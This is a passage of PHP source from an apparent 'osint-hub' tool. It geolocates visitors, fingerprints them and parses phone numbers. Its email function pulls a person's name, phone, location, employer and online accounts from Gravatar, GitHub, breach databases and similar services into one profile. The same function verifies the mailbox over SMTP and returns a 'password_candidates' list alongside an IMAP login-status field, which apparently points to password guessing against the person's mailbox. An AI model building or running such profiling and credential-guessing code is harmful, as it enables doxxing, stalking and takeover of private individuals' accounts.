                'city'=>$j['city'] ?? '','lat'=>$j['lat'] ?? null,'lon'=>$j['lon'] ?? null,'geo_src'=>'ip',
                'isp'=>$j['isp'] ?? null,'asn'=>$j['as'] ?? null,'org'=>$j['org'] ?? null,
                'timezone'=>$j['timezone'] ?? null,'proxy'=>(bool)($j['proxy'] ?? false),'hosting'=>(bool)($j['hosting'] ?? false)];
    }
    if ($out) cache_set('geo:'.$ip, $out, setting_int('geo_ttl',604800));
    return $out;
}
function geocode(string $q): array {
    $q = trim($q); if ($q === '') return ['ok'=>false,'error'=>'empty address'];
    $ck = 'geo:a:'.md5(strtolower($q)); if ($c = cache_get($ck)) return $c;
    $j = http_json('https://nominatim.openstreetmap.org/search?'.http_build_query(['q'=>$q,'format'=>'json','addressdetails'=>1,'limit'=>1]), ['timeout'=>10,'ua'=>APP_UA]);
    if (!$j || !isset($j[0])) { $r = ['ok'=>false,'error'=>'not found','query'=>$q]; cache_set($ck,$r,86400); return $r; }
    $r = $j[0]; $a = $r['address'] ?? [];
    $out = ['ok'=>true,'query'=>$q,'display_name'=>$r['display_name'] ?? '',
        'street'=>trim(($a['house_number'] ?? '').' '.($a['road'] ?? '')),
        'city'=>$a['city'] ?? $a['town'] ?? $a['village'] ?? '', 'region'=>$a['state'] ?? '',
        'postcode'=>$a['postcode'] ?? '', 'country'=>$a['country'] ?? '',
        'country_code'=>strtoupper($a['country_code'] ?? ''), 'lat'=>(float)($r['lat'] ?? 0), 'lon'=>(float)($r['lon'] ?? 0)];
    cache_set($ck,$out,86400*30);
    return $out;
}
function reverse_geocode(float $lat, float $lon): array {
    $ck = 'geo:r:'.round($lat,4).','.round($lon,4);
    if ($c = cache_get($ck)) return $c;
    $j = http_json('https://nominatim.openstreetmap.org/reverse?'.http_build_query([
        'lat'=>$lat,'lon'=>$lon,'format'=>'json','addressdetails'=>1,'zoom'=>18]), ['timeout'=>10,'ua'=>APP_UA]);
    if (!$j || isset($j['error'])) return [];
    $a = $j['address'] ?? [];
    $out = ['display_name'=>$j['display_name'] ?? '', 'street'=>trim(($a['house_number'] ?? '').' '.($a['road'] ?? '')),
        'city'=>$a['city'] ?? $a['town'] ?? $a['village'] ?? $a['suburb'] ?? '', 'region'=>$a['state'] ?? '',
        'postcode'=>$a['postcode'] ?? '', 'country'=>$a['country'] ?? '', 'country_code'=>strtoupper($a['country_code'] ?? '')];
    cache_set($ck,$out,86400*30);
    return $out;
}
function fmt_address(?array $a): string {
    if (!$a) return '';
    return implode(', ', array_filter([$a['street'] ?? '',$a['city'] ?? '',$a['region'] ?? '',$a['postcode'] ?? '',$a['country'] ?? '']));
}

/* ============================ INTELLIGENCE ========================= */
function fact(string $field, $value, string $source, int $confidence, array $extra = []): array {
    return ['field'=>$field,'value'=>$value,'source'=>$source,'confidence'=>$confidence] + $extra;
}
function merge_facts(array $facts): array {
    $g = [];
    foreach ($facts as $f) {
        if ($f['value'] === null || $f['value'] === '') continue;
        $key = $f['field'] . '|' . mb_strtolower(trim((string)$f['value']));
        if (!isset($g[$key])) $g[$key] = ['field'=>$f['field'],'value'=>$f['value'],'sources'=>[],'miss'=>1.0];
        $g[$key]['sources'][] = ['source'=>$f['source'],'confidence'=>(int)$f['confidence']];
        $g[$key]['miss'] *= (1 - max(0, min(100, (int)$f['confidence'])) / 100);
    }
    $out = [];
    foreach ($g as $x) { $x['confidence'] = (int)round((1 - $x['miss']) * 100); unset($x['miss']); $out[] = $x; }
    usort($out, fn($a,$b) => $b['confidence'] <=> $a['confidence']);
    return $out;
}
function haversine(float $a1, float $o1, float $a2, float $o2): float {
    $R = 6371; $dLat = deg2rad($a2-$a1); $dLon = deg2rad($o2-$o1);
    $x = sin($dLat/2)**2 + cos(deg2rad($a1))*cos(deg2rad($a2))*sin($dLon/2)**2;
    return $R * 2 * atan2(sqrt($x), sqrt(1-$x));
}
function detect_anomalies(string $vid, ?float $lat, ?float $lon, array $geo, string $devType, ?string $fp): array {
    $out = [];
    $st = db()->prepare('SELECT ts,lat,lon,country FROM events WHERE visitor_id = ? AND lat IS NOT NULL ORDER BY id DESC LIMIT 1');
    $st->execute([$vid]);
    if ($prev = $st->fetch()) {
        if ($lat !== null && $lon !== null && $prev['lat'] !== null) {
            $dt = max(0.001, (time() - strtotime((string)$prev['ts'])) / 3600);
            $d = haversine((float)$prev['lat'], (float)$prev['lon'], $lat, $lon);
            if ($dt < 24 && $d > 120) {
                $kmh = $d / $dt;
                if ($kmh > 900) $out[] = ['type'=>'impossible_travel','severity'=>'high'];
                elseif ($kmh > 300) $out[] = ['type'=>'rapid_move','severity'=>'medium'];
            }
        }
        if (($prev['country'] ?? '') && ($geo['country'] ?? '') && $prev['country'] !== $geo['country'])
            $out[] = ['type'=>'country_change','severity'=>'low'];
    }
    if (!empty($geo['proxy']))   $out[] = ['type'=>'proxy','severity'=>'medium'];
    if (!empty($geo['hosting'])) $out[] = ['type'=>'datacenter','severity'=>'low'];
    if ($devType === 'bot')      $out[] = ['type'=>'bot','severity'=>'low'];
    if ($fp) {
        $st = db()->prepare('SELECT fp FROM visitors WHERE visitor_id = ?'); $st->execute([$vid]);
        if (($known = $st->fetchColumn()) && $known !== $fp) $out[] = ['type'=>'fingerprint_change','severity'=>'medium'];
    }
    return $out;
}
function phone_snapshot(string $e164, array $d): array {
    $pdo = db();
    $sig = md5(json_encode([$d['carrier'] ?? null,$d['line_type'] ?? null,$d['hlr']['mccmnc'] ?? null]));
    $st = $pdo->prepare('SELECT * FROM phone_snapshots WHERE e164 = ? ORDER BY id DESC LIMIT 1'); $st->execute([$e164]);
    $prev = $st->fetch(); $changes = [];
    if ($prev) foreach (['carrier'=>$d['carrier'] ?? null,'line_type'=>$d['line_type'] ?? null,'active'=>$d['hlr']['active'] ?? null] as $f=>$now)
        if (($prev[$f] ?? null) != $now && $now !== null) $changes[] = ['field'=>$f,'from'=>$prev[$f],'to'=>$now];
    $pdo->prepare('INSERT INTO phone_snapshots (e164,ts,carrier,line_type,country,mccmnc,active,signature) VALUES (?,?,?,?,?,?,?,?)')
        ->execute([$e164, gmdate('Y-m-d H:i:s'), $d['carrier'] ?? null, $d['line_type'] ?? null,
            $d['country'] ?? null, $d['hlr']['mccmnc'] ?? null, $d['hlr']['active'] ?? null, $sig]);
    $score = 0; $why = [];
    foreach ($changes as $c) {
        if ($c['field'] === 'carrier') { $score += 35; $why[] = 'carrier changed'; }
        if ($c['field'] === 'active' && $c['from'] === 'ABSENT') { $score += 25; $why[] = 'reconnected'; }
        if ($c['field'] === 'line_type') { $score += 15; $why[] = 'line type changed'; }
    }
    return ['changes'=>$changes,'recycle_score'=>min(100,$score),'recycle_reasons'=>$why,'recycled'=>$score >= 35];
}

/* ======================= COUNTRY DATASET =========================== */
const CC = [
'1'=>['US','United States',[10,10],[]],'7'=>['RU','Russia',[10,10],['9']],'20'=>['EG','Egypt',[10,10],['1']],
'27'=>['ZA','South Africa',[9,9],['6','7','8']],'30'=>['GR','Greece',[10,10],['69']],'31'=>['NL','Netherlands',[9,9],['6']],
'32'=>['BE','Belgium',[9,9],['4']],'33'=>['FR','France',[9,9],['6','7']],'34'=>['ES','Spain',[9,9],['6','7']],
'36'=>['HU','Hungary',[9,9],['20','30','31','70']],'39'=>['IT','Italy',[10,10],['3']],'40'=>['RO','Romania',[9,9],['7']],
'41'=>['CH','Switzerland',[9,9],['7']],'43'=>['AT','Austria',[10,11],['6']],'44'=>['GB','United Kingdom',[10,10],['7']],
'45'=>['DK','Denmark',[8,8],[]],'46'=>['SE','Sweden',[9,9],['7']],'47'=>['NO','Norway',[8,8],['4','9']],
'48'=>['PL','Poland',[9,9],['5','6','7','8']],'49'=>['DE','Germany',[10,11],['15','16','17']],'51'=>['PE','Peru',[9,9],['9']],
'52'=>['MX','Mexico',[10,10],[]],'53'=>['CU','Cuba',[8,8],['5']],'54'=>['AR','Argentina',[10,11],['9']],
'55'=>['BR','Brazil',[10,11],['9']],'56'=>['CL','Chile',[9,9],['9']],'57'=>['CO','Colombia',[10,10],['3']],
'58'=>['VE','Venezuela',[10,10],['4']],'60'=>['MY','Malaysia',[9,10],['1']],'61'=>['AU','Australia',[9,9],['4']],
'62'=>['ID','Indonesia',[9,12],['8']],'63'=>['PH','Philippines',[10,10],['9']],'64'=>['NZ','New Zealand',[8,10],['2']],
'65'=>['SG','Singapore',[8,8],['8','9']],'66'=>['TH','Thailand',[9,9],['6','8','9']],'81'=>['JP','Japan',[10,10],['7','8','9']],
'82'=>['KR','South Korea',[9,10],['1']],'84'=>['VN','Vietnam',[9,10],['3','5','7','8','9']],'86'=>['CN','China',[11,11],['1']],
'90'=>['TR','Turkey',[10,10],['5']],'91'=>['IN','India',[10,10],['6','7','8','9']],'92'=>['PK','Pakistan',[10,10],['3']],
'93'=>['AF','Afghanistan',[9,9],['7']],'94'=>['LK','Sri Lanka',[9,9],['7']],'95'=>['MM','Myanmar',[9,10],['9']],
'98'=>['IR','Iran',[10,10],['9']],'212'=>['MA','Morocco',[9,9],['6','7']],'213'=>['DZ','Algeria',[9,9],['5','6','7']],
'216'=>['TN','Tunisia',[8,8],['2','4','5','9']],'218'=>['LY','Libya',[9,10],['9']],'220'=>['GM','Gambia',[7,7],[]],
'221'=>['SN','Senegal',[9,9],['7']],'233'=>['GH','Ghana',[9,9],['2','5']],'234'=>['NG','Nigeria',[10,10],['7','8','9']],
'250'=>['RW','Rwanda',[9,9],['7']],'251'=>['ET','Ethiopia',[9,9],['9']],'254'=>['KE','Kenya',[9,9],['1','7']],
'255'=>['TZ','Tanzania',[9,9],['6','7']],'256'=>['UG','Uganda',[9,9],['7']],'260'=>['ZM','Zambia',[9,9],['9']],
'263'=>['ZW','Zimbabwe',[9,10],['7']],'264'=>['NA','Namibia',[9,9],['8']],'265'=>['MW','Malawi',[9,9],['9']],
'267'=>['BW','Botswana',[8,8],['7']],'351'=>['PT','Portugal',[9,9],['9']],'352'=>['LU','Luxembourg',[9,9],['6']],
'353'=>['IE','Ireland',[9,9],['8']],'354'=>['IS','Iceland',[7,7],['6','7','8']],'355'=>['AL','Albania',[9,9],['6']],
'356'=>['MT','Malta',[8,8],['7','9']],'357'=>['CY','Cyprus',[8,8],['9']],'358'=>['FI','Finland',[9,10],['4','5']],
'359'=>['BG','Bulgaria',[9,9],['8','9']],'370'=>['LT','Lithuania',[8,8],['6']],'371'=>['LV','Latvia',[8,8],['2']],
'372'=>['EE','Estonia',[8,8],['5']],'373'=>['MD','Moldova',[8,8],['6','7']],'374'=>['AM','Armenia',[8,8],['7','9']],
'375'=>['BY','Belarus',[9,9],['2','3','4']],'376'=>['AD','Andorra',[6,9],['3','4','6']],'377'=>['MC','Monaco',[8,9],['4','6']],
'380'=>['UA','Ukraine',[9,9],['5','6','7','9']],'381'=>['RS','Serbia',[9,10],['6']],'382'=>['ME','Montenegro',[8,8],['6','7']],
'385'=>['HR','Croatia',[9,9],['9']],'386'=>['SI','Slovenia',[8,8],['3','4','5','6','7']],'387'=>['BA','Bosnia',[8,8],['6']],
'389'=>['MK','North Macedonia',[8,8],['7']],'420'=>['CZ','Czechia',[9,9],['6','7']],'421'=>['SK','Slovakia',[9,9],['9']],
'423'=>['LI','Liechtenstein',[7,9],['7']],'501'=>['BZ','Belize',[7,7],['6']],'502'=>['GT','Guatemala',[8,8],['3','5']],
'503'=>['SV','El Salvador',[8,8],['6','7']],'504'=>['HN','Honduras',[8,8],['3','8','9']],'505'=>['NI','Nicaragua',[8,8],['5','7','8']],
'506'=>['CR','Costa Rica',[8,8],['5','6','7','8']],'507'=>['PA','Panama',[8,8],['6']],'509'=>['HT','Haiti',[8,8],['3','4']],
'591'=>['BO','Bolivia',[8,8],['6','7']],'592'=>['GY','Guyana',[7,7],['6']],'593'=>['EC','Ecuador',[9,9],['9']],
'595'=>['PY','Paraguay',[9,9],['9']],'598'=>['UY','Uruguay',[8,8],['9']],'673'=>['BN','Brunei',[7,7],['7','8']],
'675'=>['PG','Papua New Guinea',[8,8],['7']],'679'=>['FJ','Fiji',[7,7],['7','9']],'852'=>['HK','Hong Kong',[8,8],['5','6','9']],
'853'=>['MO','Macau',[8,8],['6']],'855'=>['KH','Cambodia',[8,9],['1','6','7','8','9']],'856'=>['LA','Laos',[8,10],['2','5','9']],
'880'=>['BD','Bangladesh',[10,10],['1']],'886'=>['TW','Taiwan',[9,9],['9']],'960'=>['MV','Maldives',[7,7],['7','9']],
'961'=>['LB','Lebanon',[7,8],['3','7','8']],'962'=>['JO','Jordan',[9,9],['7']],'963'=>['SY','Syria',[9,9],['9']],
'964'=>['IQ','Iraq',[10,10],['7']],'965'=>['KW','Kuwait',[8,8],['5','6','9']],'966'=>['SA','Saudi Arabia',[9,9],['5']],
'967'=>['YE','Yemen',[9,9],['7']],'968'=>['OM','Oman',[8,8],['7','9']],'971'=>['AE','UAE',[9,9],['5']],
'972'=>['IL','Israel',[9,9],['5']],'973'=>['BH','Bahrain',[8,8],['3']],'974'=>['QA','Qatar',[8,8],['3','5','6','7']],
'975'=>['BT','Bhutan',[8,8],['1','7']],'976'=>['MN','Mongolia',[8,8],['8','9']],'977'=>['NP','Nepal',[10,10],['9']],
'992'=>['TJ','Tajikistan',[9,9],['9']],'993'=>['TM','Turkmenistan',[8,8],['6']],'994'=>['AZ','Azerbaijan',[9,9],['5','7']],
'995'=>['GE','Georgia',[9,9],['5']],'996'=>['KG','Kyrgyzstan',[9,9],['5','7']],'998'=>['UZ','Uzbekistan',[9,9],['9']],
];
const NANP_REGION = ['201'=>'NJ','202'=>'DC','203'=>'CT','205'=>'AL','206'=>'WA','207'=>'ME','208'=>'ID','209'=>'CA','210'=>'TX','212'=>'NY','213'=>'CA','214'=>'TX','215'=>'PA','216'=>'OH','217'=>'IL','218'=>'MN','219'=>'IN','224'=>'IL','225'=>'LA','228'=>'MS','229'=>'GA','231'=>'MI','234'=>'OH','239'=>'FL','240'=>'MD','248'=>'MI','251'=>'AL','252'=>'NC','253'=>'WA','254'=>'TX','256'=>'AL','260'=>'IN','262'=>'WI','267'=>'PA','269'=>'MI','270'=>'KY','276'=>'VA','281'=>'TX','301'=>'MD','302'=>'DE','303'=>'CO','304'=>'WV','305'=>'FL','307'=>'WY','309'=>'IL','310'=>'CA','312'=>'IL','313'=>'MI','314'=>'MO','315'=>'NY','316'=>'KS','317'=>'IN','318'=>'LA','319'=>'IA','320'=>'MN','321'=>'FL','323'=>'CA','325'=>'TX','330'=>'OH','331'=>'IL','334'=>'AL','336'=>'NC','337'=>'LA','339'=>'MA','346'=>'TX','347'=>'NY','351'=>'MA','352'=>'FL','360'=>'WA','361'=>'TX','364'=>'KY','369'=>'CA','380'=>'OH','385'=>'UT','386'=>'FL','401'=>'RI','402'=>'NE','404'=>'GA','405'=>'OK','406'=>'MT','407'=>'FL','408'=>'CA','409'=>'TX','410'=>'MD','412'=>'PA','413'=>'MA','414'=>'WI','415'=>'CA','417'=>'MO','419'=>'OH','423'=>'TN','424'=>'CA','425'=>'WA','430'=>'TX','432'=>'TX','434'=>'VA','435'=>'UT','440'=>'OH','442'=>'CA','443'=>'MD','445'=>'PA','447'=>'IL','458'=>'OR','469'=>'TX','470'=>'GA','475'=>'CT','478'=>'GA','479'=>'AR','480'=>'AZ','484'=>'PA','501'=>'AR','502'=>'KY','503'=>'OR','504'=>'LA','505'=>'NM','507'=>'MN','508'=>'MA','509'=>'WA','510'=>'CA','512'=>'TX','513'=>'OH','515'=>'IA','516'=>'NY','517'=>'MI','518'=>'NY','520'=>'AZ','530'=>'CA','531'=>'NE','534'=>'WI','539'=>'OK','540'=>'VA','541'=>'OR','551'=>'NJ','559'=>'CA','561'=>'FL','562'=>'CA','563'=>'IA','567'=>'OH','570'=>'PA','571'=>'VA','573'=>'MO','574'=>'IN','575'=>'NM','580'=>'OK','585'=>'NY','586'=>'MI','601'=>'MS','602'=>'AZ','603'=>'NH','605'=>'SD','606'=>'KY','607'=>'NY','608'=>'WI','609'=>'NJ','610'=>'PA','612'=>'MN','614'=>'OH','615'=>'TN','616'=>'MI','617'=>'MA','618'=>'IL','619'=>'CA','620'=>'KS','623'=>'AZ','626'=>'CA','628'=>'CA','629'=>'TN','630'=>'IL','631'=>'NY','636'=>'MO','641'=>'IA','646'=>'NY','650'=>'CA','651'=>'MN','657'=>'CA','660'=>'MO','661'=>'CA','662'=>'MS','667'=>'MD','669'=>'CA','678'=>'GA','681'=>'WV','682'=>'TX','701'=>'ND','702'=>'NV','703'=>'VA','704'=>'NC','706'=>'GA','707'=>'CA','708'=>'IL','712'=>'IA','713'=>'TX','714'=>'CA','715'=>'WI','716'=>'NY','717'=>'PA','718'=>'NY','719'=>'CO','720'=>'CO','724'=>'PA','725'=>'NV','727'=>'FL','731'=>'TN','732'=>'NJ','734'=>'MI','737'=>'TX','740'=>'OH','747'=>'CA','754'=>'FL','757'=>'VA','760'=>'CA','762'=>'GA','763'=>'MN','765'=>'IN','769'=>'MS','770'=>'GA','772'=>'FL','773'=>'IL','774'=>'MA','775'=>'NV','779'=>'IL','781'=>'MA','785'=>'KS','786'=>'FL','801'=>'UT','802'=>'VT','803'=>'SC','804'=>'VA','805'=>'CA','806'=>'TX','808'=>'HI','810'=>'MI','812'=>'IN','813'=>'FL','814'=>'PA','815'=>'IL','816'=>'MO','817'=>'TX','818'=>'CA','828'=>'NC','830'=>'TX','831'=>'CA','832'=>'TX','843'=>'SC','845'=>'NY','847'=>'IL','848'=>'NJ','850'=>'FL','856'=>'NJ','857'=>'MA','858'=>'CA','859'=>'KY','860'=>'CT','862'=>'NJ','863'=>'FL','864'=>'SC','865'=>'TN','870'=>'AR','872'=>'IL','878'=>'PA','901'=>'TN','903'=>'TX','904'=>'FL','906'=>'MI','907'=>'AK','908'=>'NJ','909'=>'CA','910'=>'NC','912'=>'GA','913'=>'KS','914'=>'NY','915'=>'TX','916'=>'CA','917'=>'NY','918'=>'OK','919'=>'NC','920'=>'WI','925'=>'CA','928'=>'AZ','929'=>'NY','930'=>'IN','931'=>'TN','936'=>'TX','937'=>'OH','940'=>'TX','941'=>'FL','947'=>'MI','949'=>'CA','951'=>'CA','952'=>'MN','954'=>'FL','956'=>'TX','959'=>'CT','970'=>'CO','971'=>'OR','972'=>'TX','973'=>'NJ','975'=>'MO','978'=>'MA','979'=>'TX','980'=>'NC','984'=>'NC','985'=>'LA','989'=>'MI'];
const TOLLFREE = ['800','822','833','844','855','866','877','880','887','888','889'];
const NANP_CA = ['204','226','236','249','250','289','306','343','354','365','367','368','403','416','418','428','431','437','438','450','468','474','506','514','519','548','579','581','584','587','604','613','639','647','672','683','705','709','742','753','778','780','782','807','819','825','867','873','879','902','905'];
const NANP_CARIB = ['242'=>'BS','246'=>'BB','264'=>'AI','268'=>'AG','284'=>'VG','340'=>'VI','345'=>'KY','441'=>'BM','473'=>'GD','649'=>'TC','658'=>'JM','664'=>'MS','670'=>'MP','671'=>'GU','684'=>'AS','721'=>'SX','758'=>'LC','767'=>'DM','784'=>'VC','787'=>'PR','809'=>'DO','829'=>'DO','849'=>'DO','868'=>'TT','869'=>'KN','876'=>'JM','939'=>'PR'];

/* ============================== PHONE ============================== */
function phone_normalize(?string $raw, ?string $cc = null): ?string {
    global $CFG; $cc ??= $CFG['default_cc'];
    if ($raw === null || trim($raw) === '') return null;
    $s = preg_replace('/[^\d+]/', '', $raw);
    if ($s === '' || $s === '+') return null;
    if (str_starts_with($s,'00')) $s = '+'.substr($s,2);
    if (!str_starts_with($s,'+')) {
        $bare = $s; $matched = false;
        for ($l = 3; $l >= 1; $l--) {
            $cand = substr($bare,0,$l);
            if (isset(CC[$cand]) && strlen($bare)-$l >= 6 && strlen($bare)-$l <= 12) { $matched = true; break; }
        }
        $s = $matched ? '+'.$bare : '+'.$cc.$bare;
    }
    $digits = substr($s,1);
    if (strlen($digits) < 6 || strlen($digits) > 15) return null;
    return '+'.$digits;
}
function phone_parse(string $e164): array {
    $digits = substr($e164,1); $cc = null;
    for ($l = 3; $l >= 1; $l--) { $c = substr($digits,0,$l); if (isset(CC[$c])) { $cc = $c; break; } }
    if (!$cc) return ['valid'=>false,'e164'=>$e164,'error'=>'unknown calling code'];
    [$iso,$name,$len,$mob] = CC[$cc];
    $national = substr($digits, strlen($cc));
    $out = ['valid'=>true,'e164'=>$e164,'calling_code'=>'+'.$cc,'country'=>$iso,'country_name'=>$name,
        'national'=>$national,'region'=>null,'line_type'=>'unknown','carrier'=>null,
        'length_ok'=>($nlen = strlen($national)) >= $len[0] && $nlen <= $len[1],
        'formats'=>['e164'=>$e164,'international'=>'+'.$cc.' '.$national,'rfc3966'=>'tel:'.$e164,'national'=>$national]];
    if ($cc === '1') {
        if ($nlen !== 10) { $out['valid'] = false; $out['error'] = 'US/CA numbers are 10 digits'; return $out; }
        $area = substr($national,0,3);
        if (in_array($area,TOLLFREE,true)) { $out['line_type']='toll-free'; $out['country_name']='United States / Canada'; }
        elseif (isset(NANP_CARIB[$area])) { $out['country']=NANP_CARIB[$area]; $out['country_name']='Caribbean ('.NANP_CARIB[$area].')'; $out['line_type']='fixed_or_mobile'; }
        elseif (in_array($area,NANP_CA,true)) { $out['country']='CA'; $out['country_name']='Canada'; $out['region']=$area; }
        else { $out['region']=NANP_REGION[$area] ?? null; $out['line_type']='fixed_or_mobile'; }
        $out['formats']['national'] = '('.$area.') '.substr($national,3,3).'-'.substr($national,6);
    } else {
        if (!$out['length_ok']) { $out['valid'] = false; $out['error'] = 'expected '.$len[0].'-'.$len[1].' digits for '.$name; }
        if ($mob) { $hit = false; foreach ($mob as $p) if (str_starts_with($national,$p)) { $hit = true; break; } $out['line_type'] = $hit ? 'mobile' : 'fixed_or_mobile'; }
        else $out['line_type'] = 'fixed_or_mobile';
    }
    return $out;
}

/* ============================ EMAIL OSINT ========================== */
const FREE_MAIL = ['gmail.com','googlemail.com','yahoo.com','hotmail.com','outlook.com','live.com','aol.com','icloud.com','me.com','protonmail.com','proton.me','gmx.com','mail.com','zoho.com','yandex.com','tutanota.com','fastmail.com','web.de'];
const ROLE_MAIL = ['info','admin','support','sales','contact','hello','help','billing','accounts','office','mail','webmaster','postmaster','noreply','no-reply','marketing','hr','jobs','careers','team','press','abuse','security'];

function email_parts(string $e): ?array {
    $e = strtolower(trim($e));
    if (!filter_var($e, FILTER_VALIDATE_EMAIL)) return null;
    [$l,$d] = explode('@',$e,2);
    return ['email'=>$e,'local'=>$l,'domain'=>$d,'md5'=>md5($e),'sha1'=>sha1($e)];
}
function disposable_domains(): array {
    return cached('disposable_list', function () {
        $r = http('https://raw.githubusercontent.com/disposable-email-domains/disposable-email-domains/master/disposable_email_blocklist.conf', ['timeout'=>12]);
        if ($r['status'] === 200 && strlen($r['body']) > 1000)
            return array_values(array_filter(array_map('trim', explode("\n",$r['body']))));
        return ['mailinator.com','guerrillamail.com','10minutemail.com','yopmail.com','trashmail.com'];
    }, 86400*7) ?? [];
}
function email_osint(string $email, bool $deep = false, bool $fast = false): array {
    global $CFG;
    if (!flag('osint_enabled')) return ['ok'=>false,'error'=>'osint disabled'];
    $p = email_parts($email);
    if (!$p) return ['ok'=>false,'error'=>'invalid email'];
    $ck = 'osint_e:'.$p['email'].($deep?':d':'');
    if (($hit = cache_get($ck)) !== null) { $hit['cached'] = true; return $hit; }

    $dom = $p['domain']; $mx = dns_mx($dom); $t0 = microtime(true);
    $jobs = [
        'grav_head'=>['url'=>'https://www.gravatar.com/avatar/'.$p['md5'].'?d=404','nobody'=>true,'timeout'=>6],
        'grav_json'=>['url'=>'https://gravatar.com/'.$p['md5'].'.json','timeout'=>7],
        'emailrep'=>['url'=>'https://emailrep.io/'.urlencode($p['email']),'headers'=>['Accept: application/json'],'timeout'=>9],
        'unavatar'=>['url'=>'https://unavatar.io/'.urlencode($p['email']),'nobody'=>true,'timeout'=>7],
        'gh'=>['url'=>'https://api.github.com/search/users?q='.urlencode($p['email']).'+in:email&per_page=5',
               'headers'=>array_merge(['Accept: application/vnd.github+json'], $CFG['github_token'] ? ['Authorization: Bearer '.$CFG['github_token']] : []),'timeout'=>9],
        'gl'=>['url'=>'https://gitlab.com/api/v4/users?search='.urlencode($p['email']),'timeout'=>9],
        'kb'=>['url'=>'https://keybase.io/_/api/1.0/user/lookup.json?email='.urlencode($p['email']),'timeout'=>9],
        'rdap'=>['url'=>'https://rdap.org/domain/'.urlencode($dom),'headers'=>['Accept: application/rdap+json'],'timeout'=>10],
    ];
    if ($CFG['hibp_key'])
        $jobs['hibp'] = ['url'=>'https://haveibeenpwned.com/api/v3/breachedaccount/'.urlencode($p['email']).'?truncateResponse=false',
                         'headers'=>['hibp-api-key: '.$CFG['hibp_key'],'User-Agent: osint-hub'],'timeout'=>12];
    else
        $jobs['xposed'] = ['url'=>'https://api.xposedornot.com/v1/check-email/'.urlencode($p['email']),'timeout'=>12];

    $H = gather($jobs);
    $J = fn($k) => (($H[$k]['status'] ?? 0) >= 200 && ($H[$k]['status'] ?? 0) < 400) ? json_decode($H[$k]['body'],true) : null;

    $facts = [];
    if (($H['grav_head']['status'] ?? 0) === 200 && ($g = $J('grav_json')) && isset($g['entry'][0])) {
        $e = $g['entry'][0];
        foreach ([['name',$e['name']['formatted'] ?? null],['name',$e['displayName'] ?? null],
                  ['username',$e['preferredUsername'] ?? null],['phone',$e['phoneNumbers'][0]['value'] ?? null],
                  ['location',$e['currentLocation'] ?? null],['job',$e['jobTitle'] ?? null],
                  ['company',$e['company'] ?? null],['bio',$e['aboutMe'] ?? null]] as [$f,$v])
            if ($v) $facts[] = fact($f,$v,'gravatar',85);
        foreach (($e['accounts'] ?? []) as $a) {
            if (!empty($a['url'])) $facts[] = fact('account',$a['url'],'gravatar',80,['platform'=>$a['shortname'] ?? '','username'=>$a['username'] ?? null]);
            if (!empty($a['username'])) $facts[] = fact('username',$a['username'],'gravatar',70);
        }
    }
    $er = $J('emailrep') ?? [];
    foreach (($er['profiles'] ?? []) as $x) $facts[] = fact('account','https://'.$x.'.com','emailrep',50,['platform'=>$x]);
    if (!empty($er['details']['name']))  $facts[] = fact('name',$er['details']['name'],'emailrep',60);
    if (!empty($er['details']['phone'])) $facts[] = fact('phone',$er['details']['phone'],'emailrep',60);
    foreach ((array)($J('gh')['items'] ?? []) as $u) {
        $facts[] = fact('account',$u['html_url'],'github',60,['platform'=>'github','username'=>$u['login']]);
        $facts[] = fact('username',$u['login'],'github',50);
    }
    foreach ((array)$J('gl') as $u) if (($u['public_email'] ?? '') === $p['email'])
        $facts[] = fact('account',$u['web_url'],'gitlab',55,['platform'=>'gitlab','username'=>$u['username']]);
    if (!empty($J('kb')['them'][0]['basics']['username'])) {
        $ku = $J('kb')['them'][0]['basics']['username'];
        $facts[] = fact('account','https://keybase.io/'.$ku,'keybase',75,['platform'=>'keybase','username'=>$ku]);
    }
    if (($H['unavatar']['status'] ?? 0) === 200) $facts[] = fact('avatar','https://unavatar.io/'.$p['email'],'unavatar',55);

    $identity = [];
    foreach (merge_facts($facts) as $f)
        if (in_array($f['field'],['name','username','phone','location','job','company','bio','avatar'],true)) $identity[$f['field']][] = $f;

    $breaches = [];
    if (!empty($H['hibp']['body']) && $H['hibp']['status'] === 200)
        foreach (json_decode($H['hibp']['body'],true) ?: [] as $b)
            $breaches[] = ['name'=>$b['Name'] ?? '','date'=>$b['BreachDate'] ?? '','count'=>$b['PwnCount'] ?? 0,
                           'classes'=>$b['DataClasses'] ?? [],'source'=>'hibp'];
    elseif (!empty($H['xposed']['body']) && $H['xposed']['status'] === 200)
        foreach ((array)(json_decode($H['xposed']['body'],true)['breaches'][0] ?? []) as $n)
            $breaches[] = ['name'=>(string)$n,'date'=>'','count'=>0,'classes'=>[],'source'=>'xposedornot'];

    $domain = ['domain'=>$dom,'mx'=>$mx,'disposable'=>in_array($dom,disposable_domains(),true),
               'free_provider'=>in_array($dom,FREE_MAIL,true)];
    if ($rd = $J('rdap')) {
        foreach (($rd['entities'] ?? []) as $ent)
            if (in_array('registrar',$ent['roles'] ?? [],true))
                foreach (($ent['vcardArray'][1] ?? []) as $v) if (($v[0] ?? '') === 'fn') $domain['registrar'] = $v[3] ?? null;
        foreach (($rd['events'] ?? []) as $ev) {
            if (($ev['eventAction'] ?? '') === 'registration') $domain['created'] = $ev['eventDate'] ?? null;
            if (($ev['eventAction'] ?? '') === 'expiration')   $domain['expires'] = $ev['eventDate'] ?? null;
        }
    }
    foreach (dns_txt($dom) as $txt) if (stripos($txt,'v=spf1') === 0) $domain['spf'] = $txt;
    foreach (dns_txt('_dmarc.'.$dom) as $txt) if (stripos($txt,'v=DMARC1') === 0) $domain['dmarc'] = $txt;
    $domain['ns'] = dns_ns($dom);

    $smtp = ['status'=>'skipped'];
    if (flag('smtp_verify') && !$fast && $mx) $smtp = smtp_verify($p['email'], $mx[0]['host']);

    $out = ['ok'=>true,'email'=>$p['email'],'generated'=>gmdate('c'),
        'latency_ms'=>(int)round((microtime(true)-$t0)*1000),
        'syntax'=>['valid'=>true,'local'=>$p['local'],'domain'=>$dom,'md5'=>$p['md5'],'sha1'=>$p['sha1']],
        'mx'=>$mx,'smtp'=>$smtp,'domain'=>$domain,'breaches'=>$breaches,'emailrep'=>$er,
        'facts'=>$facts,'identity'=>$identity,
        'gravatar'=>['exists'=>($H['grav_head']['status'] ?? 0) === 200,'avatar'=>'https://www.gravatar.com/avatar/'.$p['md5'].'?s=200'],
        'accounts'=>array_values(array_filter(array_map(fn($f) => $f['field'] === 'account'
            ? ['platform'=>$f['platform'] ?? parse_url((string)$f['value'],PHP_URL_HOST),'url'=>$f['value'],
               'username'=>$f['username'] ?? null,'confidence'=>$f['confidence']] : null, merge_facts($facts)))),
        'password_candidates'=>password_candidates($p['email']),'imap'=>['status'=>'not_attempted']];

